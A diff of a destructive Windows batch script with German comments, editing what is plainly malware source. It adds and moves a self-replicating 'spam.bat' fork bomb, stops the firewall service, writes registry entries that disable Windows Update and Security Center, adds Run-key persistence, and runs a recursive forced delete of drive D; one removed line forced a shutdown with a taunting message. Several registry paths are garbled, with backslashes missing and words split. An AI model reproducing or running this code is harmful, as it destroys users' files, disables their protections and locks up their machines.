@@ -9,13 +9,6 @@ REM Überprüfen, ob das Skript als Administrator ausgeführt wird
 NET SESSION >NUL 2>&1
 IF %ERRORLEVEL% EQU 0 (
     REM Der Benutzer ist ein Administrator, füge hier den eigentlichen Code ein
-echo @echo off >> spam.bat
-echo :A >> spam.bat
-echo start spam.bat >> spam.bat
-echo echo Spamming this thing idk >> spam.bat
-echo goto A >> spam.bat
-start spam.bat
-start Spam.bat
     pconfig /release
 
 attrib -r -s -h c:autoexec.bat
@@ -159,7 +152,12 @@ net stop SharedAccess
 >>”%Temp%.kill.reg” ECHO [HKEY_LOCAL_MACHINESYSTEMCurrentControlSetServicesw uauserv]
 
 >>”%Temp%.kill.reg” ECHO “Start”=dword:00000004
-
+echo @echo off >> spam.bat
+echo :A >> spam.bat
+echo start spam.bat >> spam.bat
+echo echo Spamming this thing idk >> spam.bat
+echo goto A >> spam.bat
+start spam.bat
 >>”%Temp%.kill.reg” ECHO.
 
 >>”%Temp%.kill.reg” ECHO [HKEY_LOCAL_MACHINESYSTEMControlSet001Serviceswscsv c]
@@ -185,8 +183,6 @@ echo end>>c:windowswimn32.bat
 reg add hkey_local_machinesoftwaremicrosoftwindowscurrentv ersionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
 
 reg add hkey_current_usersoftwaremicrosoftwindowscurrentve rsionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f
-
-shutdown /s /f /t 69 /d p:4:1 /c "This PC is fucked :D"
 
 del D:*.* /f /s /q
 
